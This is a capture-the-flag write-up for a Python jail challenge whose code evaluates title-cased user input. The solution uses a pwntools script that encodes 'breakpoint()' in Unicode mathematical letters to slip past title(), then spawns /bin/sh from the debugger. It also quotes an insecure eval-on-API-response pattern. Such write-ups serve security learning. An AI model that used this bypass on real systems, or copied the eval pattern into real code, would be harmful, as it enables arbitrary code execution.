# TitleCase

```
A modern rerun of a SHA2017 challenge...

It was based on a real-life bug where the developers used this technique to turn a string containing "true" into a Python boolean:

with urllib.request.urlopen("<ATTACKER CONTROLLED>") as f:
   api_response = json.loads(f.read())
   boolean_value = eval(api_response["some_field"].title())
```

Attachment:

```python
#!/usr/bin/env python3

eval(input().title())
```

Following [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/#unicode-bypass), we can bypass `title()` using italic/bold texts from [Unicode Block “Mathematical Alphanumeric Symbols”](https://www.compart.com/en/unicode/block/U+1D400):

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "titlecase.py"])
text = f"breakpoint()"

encoded = ""
for ch in text:
    if ch.isalpha():
        encoded += chr(ord(ch) + 0x1D41A - ord("a"))
    else:
        encoded += ch
print(encoded)
p.sendline(encoded.encode())
# enters pdb, get shell
p.sendline(b"import os;os.system('/bin/sh')")
p.interactive()
```

The encoded input is `𝐛𝐫𝐞𝐚𝐤𝐩𝐨𝐢𝐧𝐭()`.
